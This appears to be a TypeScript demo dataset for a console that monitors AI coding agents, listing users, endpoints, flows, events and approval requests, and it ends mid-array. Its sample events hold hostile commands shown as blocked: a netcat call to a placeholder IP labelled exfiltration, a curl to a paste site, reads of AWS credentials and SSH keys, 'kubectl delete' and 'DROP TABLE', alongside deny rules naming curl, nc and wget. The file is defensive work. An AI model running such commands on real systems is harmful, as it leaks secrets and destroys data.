/**
 * Demo dataset for the console. Every shape is typed in `types.ts` after
 * effigentd's own model, so wiring a view to the control-plane API means
 * replacing an import here — not reshaping the view. Times are pre-rendered
 * strings ("2 min ago") so server and client render identically.
 */
import type {
  Agent, AgentType, Approval, ConsoleEvent, Endpoint, Env, Flow, ListEntry, Mode, Policy, Resource, User,
} from './types.ts';

export const AGENT_TYPES: Record<AgentType, { label: string; vendor: string; kind: string; color: string; icon: string }> = {
  'claude-code': { label: 'Claude Code', vendor: 'Anthropic', kind: 'Coding Agent', color: '#e07a52', icon: 'burst' },
  'claude-cowork': { label: 'Claude Cowork', vendor: 'Anthropic', kind: 'Desktop Agent', color: '#e07a52', icon: 'burst' },
  'cursor-agent': { label: 'Cursor', vendor: 'Anysphere', kind: 'Coding Agent', color: '#cfd6e6', icon: 'cube' },
  codex: { label: 'Codex', vendor: 'OpenAI', kind: 'Coding Agent', color: '#3fc9a0', icon: 'hex' },
  'gemini-cli': { label: 'Gemini CLI', vendor: 'Google', kind: 'Coding Agent', color: '#6c9bff', icon: 'spark' },
  aider: { label: 'Aider', vendor: 'Open source', kind: 'Pair Programmer', color: '#a3e635', icon: 'terminal' },
  opencode: { label: 'OpenCode', vendor: 'Open source', kind: 'Coding Agent', color: '#c4b5fd', icon: 'code' },
  goose: { label: 'Goose', vendor: 'Block', kind: 'Software Engineer', color: '#fbbf24', icon: 'feather' },
};

export type AgentMeta = (typeof AGENT_TYPES)[AgentType];

/** Display metadata for any agent name effigentd reports — tenants can define
 *  agents beyond the built-in list (policy `agents:`), so never index AGENT_TYPES blindly. */
export function agentMeta(name: string | null | undefined): AgentMeta {
  if (name && name in AGENT_TYPES) return AGENT_TYPES[name as AgentType];
  const label = !name ? 'Unknown agent' : name.startsWith('mcp:') ? `MCP ${name.slice(4)}` : name.replace(/(^|[-_])(\w)/g, (_, s, c) => (s ? ' ' : '') + c.toUpperCase());
  return { label, vendor: 'Custom', kind: name?.startsWith('mcp:') ? 'MCP server' : 'Agent', color: '#94a3b8', icon: 'cube' };
}

export const ENVS: { id: Env; label: string; short: string; color: string }[] = [
  { id: 'production', label: 'Production', short: 'Prod', color: 'var(--green)' },
  { id: 'staging', label: 'Staging', short: 'Staging', color: 'var(--blue)' },
  { id: 'development', label: 'Development', short: 'Dev', color: 'var(--txt-3)' },
];
export const envMeta = (e: Env) => ENVS.find((x) => x.id === e)!;

export const MODES: Record<Mode, { label: string; desc: string }> = {
  monitor: { label: 'Monitor', desc: 'Observe only — policy matches are reported as would_block' },
  learn: { label: 'Learn', desc: 'Monitor + record every binary the agent runs (seed for an allowlist)' },
  denylist: { label: 'Denylist', desc: 'The kernel blocks exec of exec_deny and opens of file_deny' },
  allowlist: { label: 'Allowlist', desc: 'The kernel blocks exec of anything not in exec_allow' },
};

export const USERS: User[] = [
  { id: 'jane.doe', name: 'Jane Doe', title: 'Developer', role: 'admin', team: 'Platform', osUsers: ['jane'], lastSeen: '1 min ago', mfa: true },
  { id: 'alex.wang', name: 'Alex Wang', title: 'Developer', role: 'member', team: 'Payments', osUsers: ['alex', 'awang'], lastSeen: '4 min ago', mfa: true },
  { id: 'sarah.lee', name: 'Sarah Lee', title: 'Developer', role: 'approver', team: 'Platform', osUsers: ['sarah'], lastSeen: '9 min ago', mfa: true },
  { id: 'mike.tan', name: 'Mike Tan', title: 'Developer', role: 'member', team: 'Mobile', osUsers: ['mtan'], lastSeen: '22 min ago', mfa: true },
  { id: 'priya.shah', name: 'Priya Shah', title: 'Product Manager', role: 'member', team: 'Growth', osUsers: ['priya'], lastSeen: '35 min ago', mfa: true, isNew: true },
  { id: 'omar.haddad', name: 'Omar Haddad', title: 'Site Reliability', role: 'approver', team: 'Ops', osUsers: ['omar', 'root'], lastSeen: '3 min ago', mfa: true },
  { id: 'lena.kim', name: 'Lena Kim', title: 'Security Engineer', role: 'admin', team: 'Security', osUsers: ['lena'], lastSeen: '6 min ago', mfa: true },
  { id: 'dan.cohen', name: 'Dan Cohen', title: 'Contractor', role: 'viewer', team: 'Payments', osUsers: ['dan'], lastSeen: '1 h ago', mfa: false, isNew: true },
  { id: 'noa.levi', name: 'Noa Levi', title: 'Developer', role: 'member', team: 'Data', osUsers: ['noa'], lastSeen: '12 min ago', mfa: true },
  { id: 'raj.patel', name: 'Raj Patel', title: 'Developer', role: 'member', team: 'Data', osUsers: ['raj'], lastSeen: '18 min ago', mfa: true },
  { id: 'emma.brooks', name: 'Emma Brooks', title: 'Product Manager', role: 'member', team: 'Mobile', osUsers: ['emma'], lastSeen: '2 h ago', mfa: true, isNew: true },
  { id: 'tom.weiss', name: 'Tom Weiss', title: 'DevOps', role: 'approver', team: 'Ops', osUsers: ['tweiss'], lastSeen: '7 min ago', mfa: true },
];
export const userById = (id: string | null | undefined) => USERS.find((u) => u.id === id);

export const ENDPOINTS: Endpoint[] = [
  { id: 'ep-jane-mbp', hostname: 'jane-mbp', os: 'macOS 26.0', platform: 'macos', sensor: 'eslogger', env: 'production', owner: 'jane.doe', version: '2.0.3', status: 'online', heartbeat: '8s ago', policyVersion: 42 },
  { id: 'ep-alex-mbp', hostname: 'alex-mbp', os: 'macOS 26.0', platform: 'macos', sensor: 'eslogger', env: 'production', owner: 'alex.wang', version: '2.0.3', status: 'online', heartbeat: '11s ago', policyVersion: 42 },
  { id: 'ep-sarah-ws', hostname: 'sarah-ws', os: 'Ubuntu 24.04', platform: 'linux', sensor: 'tetragon', env: 'staging', owner: 'sarah.lee', version: '2.0.3', status: 'online', heartbeat: '4s ago', policyVersion: 42 },
  { id: 'ep-mike-mbp', hostname: 'mike-mbp', os: 'macOS 15.6', platform: 'macos', sensor: 'eslogger', env: 'development', owner: 'mike.tan', version: '2.0.2', status: 'online', heartbeat: '19s ago', policyVersion: 41 },
  { id: 'ep-priya-mba', hostname: 'priya-mba', os: 'macOS 26.0', platform: 'macos', sensor: 'eslogger', env: 'development', owner: 'priya.shah', version: '2.0.3', status: 'online', heartbeat: '27s ago', policyVersion: 42 },
  { id: 'ep-bastion-01', hostname: 'prod-bastion-01', os: 'Ubuntu 24.04', platform: 'linux', sensor: 'tetragon', env: 'production', owner: 'omar.haddad', version: '2.0.3', status: 'online', heartbeat: '3s ago', policyVersion: 42 },
  { id: 'ep-lena-mbp', hostname: 'lena-mbp', os: 'macOS 26.0', platform: 'macos', sensor: 'eslogger', env: 'production', owner: 'lena.kim', version: '2.0.3', status: 'online', heartbeat: '6s ago', policyVersion: 42 },
  { id: 'ep-dan-vm', hostname: 'dan-dev-vm', os: 'Debian 13', platform: 'linux', sensor: 'tetragon', env: 'development', owner: 'dan.cohen', version: '2.0.1', status: 'degraded', heartbeat: '2 min ago', policyVersion: 39 },
  { id: 'ep-noa-mbp', hostname: 'noa-mbp', os: 'macOS 26.0', platform: 'macos', sensor: 'eslogger', env: 'staging', owner: 'noa.levi', version: '2.0.3', status: 'online', heartbeat: '14s ago', policyVersion: 42 },
  { id: 'ep-raj-ws', hostname: 'raj-ws', os: 'Fedora 43', platform: 'linux', sensor: 'tetragon', env: 'staging', owner: 'raj.patel', version: '2.0.3', status: 'online', heartbeat: '5s ago', policyVersion: 42 },
  { id: 'ep-emma-mba', hostname: 'emma-mba', os: 'macOS 15.6', platform: 'macos', sensor: 'eslogger', env: 'development', owner: 'emma.brooks', version: '2.0.2', status: 'online', heartbeat: '41s ago', policyVersion: 41 },
  { id: 'ep-ops-02', hostname: 'ops-runner-02', os: 'Ubuntu 22.04', platform: 'linux', sensor: 'tetragon', env: 'production', owner: 'tom.weiss', version: '2.0.3', status: 'online', heartbeat: '2s ago', policyVersion: 42 },
  { id: 'ep-ci-03', hostname: 'ci-runner-03', os: 'Ubuntu 24.04', platform: 'linux', sensor: 'tetragon', env: 'staging', owner: 'tom.weiss', version: '2.0.0', status: 'offline', heartbeat: '3 h ago', policyVersion: 37 },
];
export const endpointById = (id: string | null | undefined) => ENDPOINTS.find((e) => e.id === id);

// [type, user, endpoint, status, mode, sessions24h, actions24h, blocked24h, lastSeen, mcp, isNew]
type AgentRow = [AgentType, string, string, Agent['status'], Mode, number, number, number, string, string[], boolean?];
const AGENT_ROWS: AgentRow[] = [
  ['claude-code', 'jane.doe', 'ep-jane-mbp', 'active', 'denylist', 6, 412, 3, 'now', ['github', 'postgres', 'slack']],
  ['cursor-agent', 'alex.wang', 'ep-alex-mbp', 'active', 'denylist', 4, 268, 1, '1 min ago', ['github']],
  ['codex', 'sarah.lee', 'ep-sarah-ws', 'active', 'allowlist', 3, 190, 2, '2 min ago', ['github', 'postgres']],
  ['claude-code', 'alex.wang', 'ep-alex-mbp', 'active', 'denylist', 3, 221, 0, '3 min ago', ['github', 'linear']],
  ['cursor-agent', 'jane.doe', 'ep-jane-mbp', 'active', 'denylist', 2, 96, 0, '5 min ago', ['github']],
  ['claude-code', 'sarah.lee', 'ep-sarah-ws', 'active', 'allowlist', 5, 377, 4, '1 min ago', ['github', 'postgres']],
  ['gemini-cli', 'mike.tan', 'ep-mike-mbp', 'idle', 'learn', 1, 34, 0, '48 min ago', []],
  ['claude-code', 'mike.tan', 'ep-mike-mbp', 'active', 'learn', 2, 145, 0, '6 min ago', ['github']],
  ['cursor-agent', 'priya.shah', 'ep-priya-mba', 'active', 'monitor', 2, 61, 0, '9 min ago', ['figma']],
  ['claude-code', 'priya.shah', 'ep-priya-mba', 'idle', 'monitor', 1, 22, 0, '1 h ago', ['notion']],
  ['codex', 'omar.haddad', 'ep-bastion-01', 'active', 'allowlist', 3, 158, 5, 'now', ['kubernetes']],
  ['claude-code', 'omar.haddad', 'ep-bastion-01', 'active', 'allowlist', 2, 133, 2, '2 min ago', ['kubernetes', 'postgres']],
  ['claude-code', 'lena.kim', 'ep-lena-mbp', 'active', 'denylist', 2, 88, 1, '4 min ago', ['github']],
  ['aider', 'dan.cohen', 'ep-dan-vm', 'active', 'monitor', 1, 47, 0, '11 min ago', [], true],
  ['opencode', 'dan.cohen', 'ep-dan-vm', 'idle', 'learn', 1, 12, 0, '2 h ago', []],
  ['cursor-agent', 'noa.levi', 'ep-noa-mbp', 'active', 'denylist', 3, 174, 1, '7 min ago', ['github', 'postgres']],
  ['claude-code', 'noa.levi', 'ep-noa-mbp', 'active', 'denylist', 2, 119, 0, '12 min ago', ['github']],
  ['codex', 'raj.patel', 'ep-raj-ws', 'active', 'denylist', 2, 102, 1, '15 min ago', ['postgres']],
  ['goose', 'raj.patel', 'ep-raj-ws', 'idle', 'learn', 1, 18, 0, '3 h ago', []],
  ['cursor-agent', 'emma.brooks', 'ep-emma-mba', 'idle', 'monitor', 1, 9, 0, '2 h ago', []],
  ['claude-code', 'emma.brooks', 'ep-emma-mba', 'active', 'monitor', 1, 53, 0, '20 min ago', ['linear']],
  ['codex', 'tom.weiss', 'ep-ops-02', 'active', 'allowlist', 4, 236, 3, '1 min ago', ['kubernetes']],
  ['gemini-cli', 'tom.weiss', 'ep-ops-02', 'idle', 'allowlist', 1, 15, 1, '1 h ago', []],
  ['codex', 'jane.doe', 'ep-jane-mbp', 'active', 'denylist', 1, 41, 0, '14 min ago', ['github'], true],
];

export const AGENTS: Agent[] = AGENT_ROWS.map(([type, user, endpoint, status, mode, s, a, b, lastSeen, mcpServers, isNew], i) => ({
  id: `ag-${String(i + 1).padStart(3, '0')}`,
  type, user, endpoint, status, mode, mcpServers, lastSeen, isNew,
  env: endpointById(endpoint)!.env,
  pid: 40211 + i * 377,
  sessions24h: s, actions24h: a, blocked24h: b,
}));

export const RESOURCES: Resource[] = [
  { id: 'github', label: 'GitHub', sub: 'Code Repository', icon: 'github' },
  { id: 'terminal', label: 'Terminal', sub: 'Local Execution', icon: 'terminal' },
  { id: 'postgres', label: 'PostgreSQL', sub: 'Database', icon: 'database' },
  { id: 'slack', label: 'Slack', sub: 'Communication', icon: 'slack' },
  { id: 'network', label: 'Network', sub: 'External Network', icon: 'globe' },
  { id: 'files', label: 'Workspace', sub: 'Project Files', icon: 'folder' },
  { id: 'secrets', label: 'Credentials', sub: '.env · ~/.ssh · ~/.aws', icon: 'key' },
  { id: 'npm', label: 'npm Registry', sub: 'Package Install', icon: 'package' },
  { id: 'k8s', label: 'Kubernetes', sub: 'prod-eu-1 cluster', icon: 'server' },
];
export const resourceById = (id: string) => RESOURCES.find((r) => r.id === id);

// [agentType, from, to, label, outcome, count24h, lastSeen]
type FlowRow = [AgentType, string, string, string, Flow['outcome'], number, string];
const FLOW_ROWS: FlowRow[] = [
  // Claude Code — the overview's hero graph (matches the design)
  ['claude-code', 'jane.doe', 'claude-code', 'git:read', 'flow', 64, 'now'],
  ['claude-code', 'alex.wang', 'claude-code', 'repo:write', 'flow', 31, '3 min ago'],
  ['claude-code', 'sarah.lee', 'claude-code', 'file:read', 'flow', 88, '1 min ago'],
  ['claude-code', 'claude-code', 'github', 'repo:read', 'allowed', 142, '1 min ago'],
  ['claude-code', 'claude-code', 'terminal', 'exec:allowed', 'allowed', 518, 'now'],
  ['claude-code', 'claude-code', 'slack', 'notify', 'flow', 9, '18 min ago'],
  ['claude-code', 'claude-code', 'network', 'exec:blocked', 'blocked', 7, '2 min ago'],
  ['claude-code', 'claude-code', 'postgres', 'db:read', 'allowed', 46, '6 min ago'],
  ['claude-code', 'claude-code', 'secrets', 'file:blocked', 'blocked', 3, '41 min ago'],
  ['claude-code', 'claude-code', 'files', 'file:write', 'pending', 1, '2 min ago'],
  // Cursor
  ['cursor-agent', 'alex.wang', 'cursor-agent', 'edit', 'flow', 52, '1 min ago'],
  ['cursor-agent', 'jane.doe', 'cursor-agent', 'edit', 'flow', 17, '5 min ago'],
  ['cursor-agent', 'noa.levi', 'cursor-agent', 'refactor', 'flow', 29, '7 min ago'],
  ['cursor-agent', 'cursor-agent', 'files', 'file:write', 'allowed', 214, 'now'],
  ['cursor-agent', 'cursor-agent', 'npm', 'npm install', 'pending', 2, '5 min ago'],
  ['cursor-agent', 'cursor-agent', 'github', 'git:push', 'allowed', 12, '9 min ago'],
  ['cursor-agent', 'cursor-agent', 'terminal', 'exec:allowed', 'allowed', 96, '2 min ago'],
  // Codex
  ['codex', 'sarah.lee', 'codex', 'task', 'flow', 21, '2 min ago'],
  ['codex', 'omar.haddad', 'codex', 'runbook', 'flow', 14, 'now'],
  ['codex', 'tom.weiss', 'codex', 'deploy', 'flow', 19, '1 min ago'],
  ['codex', 'codex', 'k8s', 'kubectl get', 'allowed', 88, 'now'],
  ['codex', 'codex', 'k8s', 'kubectl delete', 'blocked', 4, '12 min ago'],
  ['codex', 'codex', 'postgres', 'db:write', 'pending', 1, '14 min ago'],
  ['codex', 'codex', 'terminal', 'exec:allowed', 'allowed', 301, 'now'],
  ['codex', 'codex', 'network', 'curl', 'blocked', 6, '25 min ago'],
  // Gemini CLI
  ['gemini-cli', 'mike.tan', 'gemini-cli', 'ask', 'flow', 6, '48 min ago'],
  ['gemini-cli', 'tom.weiss', 'gemini-cli', 'ask', 'flow', 3, '1 h ago'],
  ['gemini-cli', 'gemini-cli', 'files', 'file:read', 'allowed', 34, '48 min ago'],
  ['gemini-cli', 'gemini-cli', 'network', 'web fetch', 'blocked', 1, '1 h ago'],
  // Aider / OpenCode / Goose
  ['aider', 'dan.cohen', 'aider', 'pair', 'flow', 11, '11 min ago'],
  ['aider', 'aider', 'files', 'file:write', 'allowed', 40, '11 min ago'],
  ['aider', 'aider', 'secrets', 'would_block', 'blocked', 1, '30 min ago'],
  ['opencode', 'dan.cohen', 'opencode', 'task', 'flow', 3, '2 h ago'],
  ['opencode', 'opencode', 'terminal', 'exec (learn)', 'allowed', 12, '2 h ago'],
  ['goose', 'raj.patel', 'goose', 'task', 'flow', 4, '3 h ago'],
  ['goose', 'goose', 'terminal', 'exec (learn)', 'allowed', 18, '3 h ago'],
];
export const FLOWS: Flow[] = FLOW_ROWS.map(([agentType, from, to, label, outcome, count24h, lastSeen], i) => ({
  id: `fl-${i + 1}`, agentType, from, to, label, outcome, count24h, lastSeen,
}));

export const EVENTS: ConsoleEvent[] = [
  { id: 'ev-9824', time: '14:33', ago: '1 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'exec: git', target: 'git status --short' },
  { id: 'ev-9821', time: '14:32', ago: '2 min ago', type: 'blocked', severity: 'high', outcome: 'blocked', title: 'Agent attempted to execute network command', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'exec: curl', target: '/usr/bin/curl https://paste.example.net', rule: 'Global Policy · exec_deny /usr/bin/curl', mode: 'denylist' },
  { id: 'ev-9823', time: '14:31', ago: '3 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'exec: ls', target: 'ls -la src/' },
  { id: 'ev-9820', time: '14:30', ago: '5 min ago', type: 'approval', severity: 'medium', outcome: 'pending', title: 'Action approval required', agentType: 'cursor-agent', user: 'alex.wang', endpoint: 'ep-alex-mbp', env: 'production', summary: 'npm install', target: 'npm install left-pad-pro@2.1.0', rule: 'Production Guardrails · package installs require approval' },
  { id: 'ev-9822', time: '14:29', ago: '6 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Called an MCP tool', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'MCP · claude-in-chrome · computer', target: 'mcp__claude-in-chrome__computer' },
  { id: 'ev-9817', time: '14:28', ago: '7 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Read project files', agentType: 'cursor-agent', user: 'alex.wang', endpoint: 'ep-alex-mbp', env: 'production', summary: 'read: /project/*', target: '/Users/alex/src/payments/**' },
  { id: 'ev-9819', time: '14:25', ago: '10 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'exec: cat', target: 'cat package.json' },
  { id: 'ev-9811', time: '14:23', ago: '12 min ago', type: 'agent_start', severity: 'info', outcome: 'allowed', title: 'New agent connected', agentType: 'aider', user: 'dan.cohen', endpoint: 'ep-dan-vm', env: 'development', summary: 'agent_start', target: 'aider --model sonnet', mode: 'monitor' },
  { id: 'ev-9808', time: '14:21', ago: '14 min ago', type: 'approval', severity: 'high', outcome: 'pending', title: 'Production database access', agentType: 'codex', user: 'sarah.lee', endpoint: 'ep-sarah-ws', env: 'staging', summary: 'access: db', target: 'psql postgres://orders-replica:5432', via: 'mcp:postgres', rule: 'MCP Server Governance · postgres writes require approval' },
  { id: 'ev-9813', time: '14:19', ago: '16 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'cursor-agent', user: 'alex.wang', endpoint: 'ep-alex-mbp', env: 'production', summary: 'exec: npm install', target: 'npm install zod@3.23.8' },
  { id: 'ev-9802', time: '14:17', ago: '18 min ago', type: 'policy', severity: 'info', outcome: 'system', title: 'Policy updated', agentType: null, user: 'lena.kim', endpoint: null, env: 'production', summary: 'policy v42', target: 'Global Policy', rule: 'Global Policy' },
  { id: 'ev-9799', time: '14:17', ago: '18 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Pushed a branch', agentType: 'cursor-agent', user: 'noa.levi', endpoint: 'ep-noa-mbp', env: 'staging', summary: 'git: push', target: 'git push origin feat/ingest-retry', via: 'mcp:github' },
  { id: 'ev-9790', time: '14:03', ago: '32 min ago', type: 'policy', severity: 'info', outcome: 'allowed', title: 'Agent removed from policy', agentType: 'goose', user: 'raj.patel', endpoint: 'ep-raj-ws', env: 'staging', summary: 'scope change', target: 'Production Guardrails', rule: 'Production Guardrails' },
  { id: 'ev-9788', time: '14:03', ago: '32 min ago', type: 'file_open', severity: 'info', outcome: 'allowed', title: 'Read a file', agentType: 'claude-code', user: 'sarah.lee', endpoint: 'ep-sarah-ws', env: 'staging', summary: 'read: file', target: '/home/sarah/infra/terraform/main.tf' },
  { id: 'ev-9781', time: '13:58', ago: '37 min ago', type: 'blocked', severity: 'high', outcome: 'blocked', title: 'Credential file open denied', agentType: 'claude-code', user: 'omar.haddad', endpoint: 'ep-bastion-01', env: 'production', summary: 'open: ~/.aws/credentials', target: '/root/.aws/credentials', rule: 'Secrets & Credentials · file_deny /.aws/credentials', mode: 'allowlist' },
  { id: 'ev-9783', time: '13:55', ago: '40 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'codex', user: 'tom.weiss', endpoint: 'ep-ops-02', env: 'production', summary: 'exec: rg', target: 'rg -n retry src/' },
  { id: 'ev-9776', time: '13:51', ago: '44 min ago', type: 'would_block', severity: 'medium', outcome: 'would_block', title: 'Would block in enforce mode', agentType: 'aider', user: 'dan.cohen', endpoint: 'ep-dan-vm', env: 'development', summary: 'open: .env', target: '/home/dan/app/.env.production', rule: 'Secrets & Credentials · file_alert /.env.production', mode: 'monitor' },
  { id: 'ev-9775', time: '13:47', ago: '48 min ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'claude-code', user: 'mike.tan', endpoint: 'ep-mike-mbp', env: 'development', summary: 'exec: rm', target: 'rm -rf .next/cache' },
  { id: 'ev-9770', time: '13:44', ago: '51 min ago', type: 'blocked', severity: 'high', outcome: 'blocked', title: 'Destructive kubectl blocked', agentType: 'codex', user: 'omar.haddad', endpoint: 'ep-bastion-01', env: 'production', summary: 'exec: kubectl delete', target: 'kubectl delete ns payments-canary', via: 'mcp:kubernetes', rule: 'Production Guardrails · kubectl delete denied', mode: 'allowlist' },
  { id: 'ev-9764', time: '13:40', ago: '55 min ago', type: 'connect', severity: 'info', outcome: 'allowed', title: 'Outbound connection', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'connect: api.github.com:443', target: '140.82.121.6:443', via: 'mcp:github' },
  { id: 'ev-9751', time: '13:22', ago: '1 h ago', type: 'approval', severity: 'medium', outcome: 'allowed', title: 'Approval granted', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'approved: git push --force-with-lease', target: 'git push --force-with-lease origin main', rule: 'Production Guardrails · force push requires approval' },
  { id: 'ev-9744', time: '13:10', ago: '1 h ago', type: 'blocked', severity: 'high', outcome: 'blocked', title: 'Exfiltration attempt blocked', agentType: 'gemini-cli', user: 'tom.weiss', endpoint: 'ep-ops-02', env: 'production', summary: 'exec: nc', target: '/usr/bin/nc 203.0.113.9 4444', rule: 'Global Policy · exec_deny /usr/bin/nc', mode: 'allowlist' },
  { id: 'ev-9738', time: '12:58', ago: '1 h ago', type: 'agent_exit', severity: 'info', outcome: 'system', title: 'Agent session ended', agentType: 'opencode', user: 'dan.cohen', endpoint: 'ep-dan-vm', env: 'development', summary: 'agent_exit', target: 'opencode (pid 45863)' },
  { id: 'ev-9731', time: '12:41', ago: '2 h ago', type: 'approval', severity: 'medium', outcome: 'blocked', title: 'Approval denied', agentType: 'codex', user: 'raj.patel', endpoint: 'ep-raj-ws', env: 'staging', summary: 'denied: drop table', target: 'psql -c "DROP TABLE events_archive"', via: 'mcp:postgres', rule: 'MCP Server Governance · postgres writes require approval' },
  { id: 'ev-9722', time: '12:30', ago: '2 h ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran test suite', agentType: 'claude-code', user: 'mike.tan', endpoint: 'ep-mike-mbp', env: 'development', summary: 'exec: npm test', target: 'npm test -- --watch=false', mode: 'learn' },
  { id: 'ev-9715', time: '12:12', ago: '2 h ago', type: 'policy', severity: 'info', outcome: 'system', title: 'Allowlist entry added', agentType: null, user: 'omar.haddad', endpoint: null, env: 'production', summary: 'exec_allow +/usr/local/bin/helm', target: 'Production Guardrails', rule: 'Production Guardrails' },
  { id: 'ev-9735', time: '12:05', ago: '2 h ago', type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran a command', agentType: 'codex', user: 'tom.weiss', endpoint: 'ep-ops-02', env: 'production', summary: 'exec: git', target: 'git diff --stat HEAD~1' },
  { id: 'ev-9702', time: '11:47', ago: '3 h ago', type: 'blocked', severity: 'medium', outcome: 'blocked', title: 'Unapproved MCP tool call', agentType: 'claude-code', user: 'lena.kim', endpoint: 'ep-lena-mbp', env: 'production', summary: 'mcp: github.delete_repo', target: 'mcp__github__delete_repository', via: 'mcp:github', rule: 'MCP Server Governance · github destructive tools denied' },
];

/** Events the overview's Live Events feed "receives" while it is open (demo). */
export const LIVE_STREAM: Omit<ConsoleEvent, 'id' | 'time' | 'ago'>[] = [
  { type: 'exec', severity: 'info', outcome: 'allowed', title: 'Ran type-check', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', summary: 'exec: tsc --noEmit', target: 'npx tsc --noEmit' },
  { type: 'would_block', severity: 'medium', outcome: 'would_block', title: 'Would block in enforce mode', agentType: 'cursor-agent', user: 'priya.shah', endpoint: 'ep-priya-mba', env: 'development', summary: 'exec: wget', target: '/usr/bin/wget https://example.org/data.csv', rule: 'Global Policy · exec_deny /usr/bin/wget', mode: 'monitor' },
  { type: 'connect', severity: 'info', outcome: 'allowed', title: 'Outbound connection', agentType: 'codex', user: 'tom.weiss', endpoint: 'ep-ops-02', env: 'production', summary: 'connect: registry.npmjs.org:443', target: '104.16.0.35:443' },
  { type: 'blocked', severity: 'high', outcome: 'blocked', title: 'Agent attempted to read SSH key', agentType: 'claude-code', user: 'omar.haddad', endpoint: 'ep-bastion-01', env: 'production', summary: 'open: ~/.ssh/id_ed25519', target: '/root/.ssh/id_ed25519', rule: 'Secrets & Credentials · file_deny /.ssh/id_ed25519', mode: 'allowlist' },
];

export const APPROVALS: Approval[] = [
  {
    id: 'apr-1042', title: 'Allow file write to /etc', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', sessionId: 'ses_7f3a9c21',
    action: { class: 'file_write', tool: 'Edit', paths: ['/etc/hosts'], cwd: '/Users/jane/src/edge-proxy' },
    fingerprint: 'fp1:9c4e1b7a2f0d8e63', policyId: 'pol-prod', ruleId: 'r-prod-3', risk: 'high',
    reason: 'file_write outside the project workspace requires approval in Production',
    requestedAgo: '2 min ago', expiresIn: '13 min', state: 'approval_pending',
  },
  {
    id: 'apr-1041', title: 'Install npm package', agentType: 'cursor-agent', user: 'alex.wang', endpoint: 'ep-alex-mbp', env: 'production', sessionId: 'ses_41bd0e77',
    action: { class: 'exec', tool: 'run_terminal_cmd', command: 'npm install left-pad-pro@2.1.0', binary: '/opt/homebrew/bin/npm', cwd: '/Users/alex/src/payments' },
    fingerprint: 'fp1:31aa07c5e9b24d10', policyId: 'pol-prod', ruleId: 'r-prod-2', risk: 'medium',
    reason: 'Package installs require approval in Production (supply-chain guard)',
    requestedAgo: '7 min ago', expiresIn: '8 min', state: 'approval_pending',
  },
  {
    id: 'apr-1040', title: 'Access production database', agentType: 'codex', user: 'sarah.lee', endpoint: 'ep-sarah-ws', env: 'staging', sessionId: 'ses_c08e5512',
    action: { class: 'mcp_call', tool: 'mcp__postgres__query', mcpServer: 'postgres', mcpTool: 'query', host: 'orders-replica.internal', port: 5432 },
    fingerprint: 'fp1:e2d95f04aa61c3b8', policyId: 'pol-mcp', ruleId: 'r-mcp-3', risk: 'high',
    reason: 'postgres MCP calls against production replicas require approval',
    requestedAgo: '14 min ago', expiresIn: '1 min', state: 'approval_pending',
  },
  {
    id: 'apr-1039', title: 'Force-push to release branch', agentType: 'claude-code', user: 'noa.levi', endpoint: 'ep-noa-mbp', env: 'staging', sessionId: 'ses_5a6c19f0',
    action: { class: 'exec', tool: 'Bash', command: 'git push --force-with-lease origin release/2.4', binary: '/usr/bin/git', cwd: '/Users/noa/src/ingest' },
    fingerprint: 'fp1:0b7d3e98c1f2a456', policyId: 'pol-prod', ruleId: 'r-prod-4', risk: 'medium',
    reason: 'Force pushes to protected branches require approval',
    requestedAgo: '16 min ago', expiresIn: '14 min', state: 'approval_pending',
  },
  {
    id: 'apr-1038', title: 'Apply Terraform plan', agentType: 'codex', user: 'tom.weiss', endpoint: 'ep-ops-02', env: 'production', sessionId: 'ses_d93f2a60',
    action: { class: 'exec', tool: 'shell', command: 'terraform apply -auto-approve plan.out', binary: '/usr/local/bin/terraform', cwd: '/srv/infra/prod-eu-1' },
    fingerprint: 'fp1:7f20a4c6b9e1d385', policyId: 'pol-prod', ruleId: 'r-prod-5', risk: 'high',
    reason: 'Infrastructure changes in Production require approval',
    requestedAgo: '21 min ago', expiresIn: '9 min', state: 'approval_pending',
  },
  {
    id: 'apr-1037', title: 'Fetch external URL', agentType: 'gemini-cli', user: 'mike.tan', endpoint: 'ep-mike-mbp', env: 'development', sessionId: 'ses_2ce4b871',
    action: { class: 'network', tool: 'web_fetch', url: 'https://gist.githubusercontent.com/…/raw/setup.sh', host: 'gist.githubusercontent.com', port: 443 },
    fingerprint: 'fp1:a51c9d7e03b6f248', policyId: 'pol-global', ruleId: 'r-g-9', risk: 'low',
    reason: 'Fetching scripts from paste/gist hosts requires approval',
    requestedAgo: '26 min ago', expiresIn: '4 min', state: 'approval_pending',
  },
  {
    id: 'apr-1036', title: 'Write to shared Slack channel', agentType: 'claude-code', user: 'priya.shah', endpoint: 'ep-priya-mba', env: 'development', sessionId: 'ses_86f1e03d',
    action: { class: 'mcp_call', tool: 'mcp__slack__post_message', mcpServer: 'slack', mcpTool: 'post_message' },
    fingerprint: 'fp1:44e8b1d0c97a3f52', policyId: 'pol-mcp', ruleId: 'r-mcp-5', risk: 'low',
    reason: 'Posting to channels outside #agents-* requires approval',
    requestedAgo: '29 min ago', expiresIn: '11 min', state: 'approval_pending',
  },
  // history
  {
